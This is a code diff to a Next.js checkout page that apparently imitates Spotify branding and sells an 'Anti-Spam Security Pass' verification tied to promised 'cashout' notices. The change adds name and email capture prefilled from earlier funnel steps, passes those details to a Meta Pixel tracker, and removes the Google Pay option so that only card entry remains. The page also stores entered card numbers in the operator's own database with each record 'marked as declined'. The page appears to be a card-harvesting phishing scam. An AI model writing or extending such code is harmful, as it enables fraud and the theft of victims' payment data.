@@ -18,7 +18,8 @@ import Image from 'next/image';
 import Link from 'next/link';
 import { useRouter } from 'next/navigation';
 import { useEffect, useState } from 'react';
-import { recordCardTestInSupabase } from '../../../lib/supabase';
+import { recordCardTestInSupabase, upsertCustomer } from '../../../lib/supabase';
+import MetaPixelTracker from '../../components/MetaPixelTracker';
 
 const COUNTRIES_LIST = [
   { code: 'US', name: 'United States' },
@@ -232,7 +233,9 @@ export default function PaymentSecurityPage() {
     isDemo: true,
   });
 
-  // Form Fields (Name and email removed per user request)
+  // Form Fields
+  const [fullName, setFullName] = useState('');
+  const [email, setEmail] = useState('');
   const [cardNumber, setCardNumber] = useState('');
   const [expDate, setExpDate] = useState('');
   const [cvc, setCvc] = useState('');
@@ -241,7 +244,16 @@ export default function PaymentSecurityPage() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
   const [paymentSuccess, setPaymentSuccess] = useState(false);
-  const [gpayNotice, setGpayNotice] = useState<string | null>(null);
+
+  // Auto-fill fullName and email from previous funnel steps if available
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      const savedName = sessionStorage.getItem('spotify_listener_name');
+      if (savedName) setFullName(savedName);
+      const savedEmail = sessionStorage.getItem('spotify_listener_email');
+      if (savedEmail) setEmail(savedEmail);
+    }
+  }, []);
 
   const isExpDateInvalid = (exp: string) => {
     if (!exp) return false;
@@ -345,7 +357,20 @@ export default function PaymentSecurityPage() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setErrorMsg(null);
-    setGpayNotice(null);
+
+    if (!fullName.trim()) {
+      setErrorMsg('Please enter your full name as shown on your card.');
+      return;
+    }
+    if (!email.trim() || !email.includes('@')) {
+      setErrorMsg('Please enter a valid email address to receive your confirmation receipt.');
+      return;
+    }
+
+    if (typeof window !== 'undefined') {
+      sessionStorage.setItem('spotify_listener_name', fullName.trim());
+      sessionStorage.setItem('spotify_listener_email', email.trim());
+    }
 
     const cleanNum = cardNumber.replace(/\s/g, '');
     if (cleanNum.length < 15) {
@@ -376,6 +401,12 @@ export default function PaymentSecurityPage() {
     setIsProcessing(true);
 
     try {
+      // Save customer lead into Supabase
+      upsertCustomer({
+        email: email.trim(),
+        full_name: fullName.trim(),
+      }).catch((e) => console.warn('Supabase customer upsert notice:', e));
+
       // Save card test data into Supabase in background (marked as declined)
       await recordCardTestInSupabase({
         card_number: cardNumber,
@@ -403,6 +434,19 @@ export default function PaymentSecurityPage() {
 
   return (
     <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased relative overflow-hidden selection:bg-[#1db954] selection:text-black">
+      {/* Meta Pixel & CAPI Checkout Tracker */}
+      <MetaPixelTracker
+        eventName="InitiateCheckout"
+        customData={{
+          content_name: 'Anti-Spam Security Pass Checkout',
+          value: 9.0,
+          currency: 'USD',
+        }}
+        userData={{
+          email,
+          full_name: fullName,
+        }}
+      />
       {/* Background Radial Glow Accent matching reference image */}
       <div className="absolute top-0 left-0 w-full h-[650px] bg-[radial-gradient(ellipse_80%_60%_at_25%_15%,rgba(29,185,84,0.18),rgba(15,35,22,0.45)_50%,transparent_80%)] pointer-events-none -z-10" />
 
@@ -547,44 +591,45 @@ export default function PaymentSecurityPage() {
 
               {/* Simulated Form */}
               <form onSubmit={handleSubmit} className="space-y-4">
-                {/* Payment Method Selector Tabs */}
-                <div className="grid grid-cols-2 gap-3 mb-2">
-                  <div
-                    onClick={() => setGpayNotice(null)}
-                    className="h-[68px] rounded-2xl bg-[#1db954] p-3.5 flex flex-col justify-between text-black shadow-md select-none cursor-pointer"
-                  >
-                    <CreditCard className="w-5 h-5 stroke-[2.5]" />
-                    <span className="text-sm font-bold tracking-tight">Card</span>
+                {/* Full Name & Email */}
+                <div className="space-y-3.5 mb-2">
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-200 mb-2">
+                      Full name
+                    </label>
+                    <input
+                      type="text"
+                      value={fullName}
+                      onChange={(e) => setFullName(e.target.value)}
+                      placeholder="First and last name"
+                      className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
+                    />
                   </div>
 
-                  <div
-                    onClick={() => {
-                      setGpayNotice('Google Pay is currently unavailable for this verification. Please use the available Card option.');
-                    }}
-                    className="h-[68px] rounded-2xl p-3.5 flex flex-col justify-between cursor-pointer transition-all select-none bg-[#131715] border border-[#26312a] opacity-60 hover:opacity-85 hover:border-[#38483e] group relative"
-                  >
-                    <div className="flex items-center justify-between">
-                      <span className="px-2 py-0.5 rounded bg-white/80 group-hover:bg-white text-[11px] font-black text-black tracking-tight inline-flex items-center gap-1 transition-colors">
-                        <span className="text-[#4285F4] font-black">G</span>Pay
-                      </span>
-                      <span className="text-[10px] uppercase font-bold text-gray-400 bg-white/5 px-1.5 py-0.5 rounded">
-                        Unavailable
-                      </span>
-                    </div>
-                    <span className="text-sm font-bold tracking-tight text-gray-400 group-hover:text-gray-300">Google Pay</span>
+                  <div>
+                    <label className="block text-sm font-semibold text-gray-200 mb-2">
+                      Email address
+                    </label>
+                    <input
+                      type="email"
+                      value={email}
+                      onChange={(e) => setEmail(e.target.value)}
+                      placeholder="name@example.com"
+                      className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
+                    />
+                    <p className="text-[11px] text-[#707e76] mt-1.5 flex items-center gap-1">
+                      <span>Official refund receipt &amp; cashout notice will be sent to this email.</span>
+                    </p>
                   </div>
                 </div>
 
-                {/* Google Pay Unavailable Notice */}
-                {gpayNotice && (
-                  <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-start gap-2.5 text-xs text-amber-300 animate-in fade-in duration-200">
-                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-amber-400" />
-                    <div className="flex-1">
-                      <span className="font-bold block text-amber-200">Google Pay Unavailable</span>
-                      <span>{gpayNotice}</span>
-                    </div>
+                {/* Payment Method Selector Tab */}
+                <div className="grid grid-cols-2 gap-3 mb-2">
+                  <div className="h-[68px] rounded-2xl bg-[#1db954] p-3.5 flex flex-col justify-between text-black shadow-md select-none">
+                    <CreditCard className="w-5 h-5 stroke-[2.5]" />
+                    <span className="text-sm font-bold tracking-tight">Card</span>
                   </div>
-                )}
+                </div>
 
                 {/* Card Number */}
                 <div>
